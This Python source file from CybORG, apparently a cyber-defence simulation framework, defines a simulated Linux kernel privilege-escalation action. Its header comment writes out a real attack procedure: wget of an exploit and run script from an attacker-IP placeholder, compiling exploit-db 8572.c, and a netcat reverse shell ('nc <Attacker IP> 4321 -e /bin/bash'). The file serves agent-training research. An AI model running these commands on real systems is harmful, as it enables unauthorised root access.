# Copyright DST Group. Licensed under the MIT license.
from ipaddress import IPv4Address

from CybORG.Shared.Actions.ShellActionsFolder.ShellPrivilegeEscalationFolder.ShellPrivilegeEscalation import \
    ShellPrivilegeEscalation

# May want to separate this action into two actions which takes a session each in future, rather than one action that
# takes two sessions
#
# Steps to perform exploit are as follows:
# On Attacker, with current dir as root:
# cp /usr/share/exploitdb/exploits/linux/local/8572.c ~
# nano run # Enter lines:
# #! /bin/bash
# nc <Attacker IP> 4321 -e /bin/bash # Close file
# python -m SimpleHTTPServer 8080
# Open another tab:
# nc -nlvp 4321
# On PublicFacing or other target:
# cd /tmp
# wget http://<Attacker IP>:8080/run
# wget http://<Attacker IP>:8080/8572.c
# gcc 8572.c -o 8572
# cat /proc/net/netlink # copy the non-zero PID
# ./8572 <PID>
# This gives a root session through the netcat listener on Attacker
# can run > python -c 'import pty; pty.spawn("/bin/bash")' # gives TTY session
# Note if the netcat listener is run but no connection is made, the netcat listener should then be closed to end action
from CybORG.Shared.Enums import FileType, AppProtocol
from CybORG.Shared.Observation import Observation
from CybORG.Simulator.File import File
from CybORG.Simulator.Host import Host
from CybORG.Simulator.State import State


class LinuxKernelPrivilegeEscalation(ShellPrivilegeEscalation):
    def __init__(self, session: int, agent: str, target_session: int):
        super().__init__(session, agent, target_session)

    def sim_execute(self, state: State):
        self.obs = Observation()
        self.obs.set_success(False)
        if self.session not in state.sessions[self.agent]:
            return self.obs
        # get hosts
        attacker_session = state.sessions[self.agent][self.session]
        user = attacker_session.user
        attacker_host = attacker_session.host

        if not attacker_session.active:
            self.obs.set_success(False)
            return self.obs

        # create run file on attacker
        run_file = File(name="run", user=attacker_session.user, path="/tmp/webserver/", file_type="nc_reverse_shell")
        attacker_session.host.files.append(run_file)

        # get file from attacker to target
        exploit_file = None
        readable = False
        for file in attacker_host.files:
            if file.file_type == FileType.UDEV141CODE:
                exploit_file = file
                readable = file.check_readable(user)
                break

        if exploit_file is None:
            self.obs.set_success(False)
            return self.obs
        if not readable:
            self.obs.set_success(False)
            return self.obs

        self.obs.add_file_info(hostid="hostid0", path=exploit_file.path, file_type=exploit_file.file_type,
                               name=exploit_file.name)

        self.run_web_server(attacker_session)

        exploit_file = self.copy_files_to_webserver(attacker_session, exploit_file)

        if self.target_session not in state.sessions[self.agent]:
            return self.obs

        target_session = state.sessions[self.agent][self.target_session]
        if not target_session.active:
            self.obs.set_success(False)
            return self.obs

        attacker_ip = None
        target_ip = None
        if attacker_session.host == target_session.host:
            attacker_ip = IPv4Address("127.0.0.1")
            target_ip = IPv4Address("127.0.0.1")
        else:
            for interface in attacker_session.host.interfaces:
                if interface.name != "lo":
                    for interface2 in target_session.host.interfaces:
                        if interface.ip_address in interface2.subnet.cidr.hosts():
                            attacker_ip = interface.ip_address
                            target_ip = interface2.ip_address
                            break

        if attacker_ip is None or target_ip is None:
            self.obs.set_success(False)
            return self.obs

        exploit_file = self.download_file(target_session, exploit_file, attacker_ip, target_ip)
        run_file = self.download_file(target_session, run_file, attacker_ip, target_ip)

        if exploit_file is None or run_file is None:
            self.obs.set_success(False)
            return self.obs

        # compile file on target
        executable_file = self.compile_file(target_session, exploit_file)

        if executable_file is None:
            self.obs.set_success(False)
            return self.obs

        nc = attacker_session.host.get_file("nc")

        # start nc listener
        local_port = 4321
        nc_process = None
        if nc is not None:
            if nc.check_executable(attacker_session.user):
                nc_process = attacker_session.host.add_process(ppid=attacker_session.process.pid,
                                                               user=attacker_session.user, program="nc",
                                                               open_ports=[{'Port': local_port, 'Application Protocol': "tcp",
                                                                     'Address': 'broadcast'}], name='nc')

        executed = False
        if executable_file.check_executable(target_session.user) and nc_process is not None:
            if run_file.check_executable(target_session.host.get_user('root')):
                new_session = state.add_session(user='root', agent=self.agent, host=target_session.host.hostname, parent=None)
                self.obs.add_session_info(hostid="hostid1", session_type="shell", timeout=0,
                                          session_id=new_session.ident, agent=self.agent)
                new_ephemeral_port = target_session.host.get_ephemeral_port()
                nc_process.connections[0]['local_address'] = attacker_ip
                nc_process.connections[0]['remote_address'] = target_ip
                nc_process.connections[0]['remote_port'] = new_ephemeral_port
                reverse_shell = {'local_port': 4444,
                                 "Application Protocol": AppProtocol,
                                 "local_address": target_ip,
                                 "remote_address": attacker_ip,
                                 "remote_port": local_port
                                 }
                target_session.process.connections.append(reverse_shell)
                self.obs.add_process(hostid="hostid0", local_port=local_port, remote_port=new_ephemeral_port,
                                     local_address=attacker_ip, remote_address=target_ip, app_protocol="tcp")
                self.obs.add_process(hostid="hostid1", local_port=new_ephemeral_port, remote_port=local_port,
                                     local_address=target_ip, remote_address=attacker_ip, app_protocol="tcp")

                executed = True

        if not executed:
            self.obs.set_success(False)
            return self.obs

        # switch user to firefart
        self.switch_user(target_session, "firefart", "password")
        self.obs.set_success(True)
        return self.obs
